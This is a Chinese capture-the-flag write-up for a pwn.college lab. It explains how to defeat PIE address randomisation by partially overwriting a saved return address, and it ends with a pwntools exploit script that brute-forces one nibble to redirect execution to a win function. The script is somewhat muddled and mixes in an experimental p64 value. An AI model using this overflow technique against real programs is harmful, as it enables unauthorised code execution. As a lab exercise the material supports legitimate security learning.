# 挑战简介
```
在之前的关卡中，您知道 win() 的地址，因为二进制文件始终加载到内存中的同一位置。在本关中，我们将探索溢出的可执行文件与位置无关时的挑战！位置无关的可执行文件加载到内存中的随机位置。因此，您无法确切知道 win() 函数的位置。

那么如何解决这个问题？在 x86（以及大多数其他现代架构）上，内存逐页映射到进程的内存空间中。出于性能和内存管理的原因，内存页面是一个连续的 0x1000（4096）字节块，从与 0x1000 对齐的页面地址开始
（稍后将在 pwn.college 课程中详细介绍！）。例如，以下都是潜在页面地址的示例：

0x5f7be1ec2000
0x7ee1382c9000
0x6513a3b67000
您看到最后三位数字（例如，12 位，或 1.5 个字节，或亲切地称为 3 个“半字节”）全为 0 了吗？我们可以使用它来部分预测二进制文件中的地址。例如，假设我们的 win() 函数位于二进制文件开头之后 0x1337 个字节处
（因此，如果二进制文件不是位置无关的，它很可能位于 0x401337）。这意味着，例如，如果我们的 PIE 二进制文件加载到页面地址 0x6513a3b67000，它的 win 函数将位于 0x6513a3b68337。如果它在 0x5f7be1ec2000 处加载，
则其 win 函数将位于 0x5f7be1ec3337，依此类推。

因此，实际上，需要知道二进制文件中任何地址的最后三个半字节，因为这些半字节不会因页面对齐（对齐到 0x1000 字节）而改变。这为我们提供了一种解决方法：我们可以覆盖保存的返回地址的最低有效字节
（我们可以通过调试二进制文件知道），以将返回重新定位到共享其他 7 个字节的任何指令。由于最后一个字节在执行之间将保持不变（由于页面对齐），因此这始终有效。如果我们想要重定向执行的地址离保存的返回地址稍远，
并且我们需要写入两个字节，那么其中一个半字节（第四个最低有效字节）将是一个猜测，并且 16 次中有 15 次是错误的。这没关系：我们可以运行我们的漏洞几次，直到它起作用（从统计上讲，11 次后的机会约为 50%，36 次后的机会约为 90%）。
```

# 思路
此题乍看有些抽象,但是原理很简单
这一题将不会再有固定的win地址,取而代之的随机的内存分布的win地址
内存分布有一个特点,就是有顺序的均匀分布,所以可以通过修改后三个半字节来定位到win函数的内存分布
但是需要解释几点
- 尽量不要用p64,因为p64所占据的栈空间是一整条的8字节,没有充满p64会用00补足,所以输入可以用b'\x'的格式进行逐个字节的输入
- 此题后三个半字节是固定的,所以后第四位的半字节是随机的,你需要不断尝试,总会成功
**答案如下**
```
#!/usr/bin/python
from pwn import *
import struct

context(os='linux',arch='AMD64',log_level='debug')
p = process('/challenge/binary-exploitation-pie-overflow-w')

p.recvuntil('Send your payload (up to 4096 bytes)!\n')
win_authed_address = p64(0x2084)    #这里只是我尝试的p64的实例,你会在返回的栈空间的情况中一睹为快
#offset_last = 
payload = b'a' * 48 + win_authed_address + b'\x84\x10'    #\x10中的1是我定向的随机数
p.send(payload)
p.recvall()
```
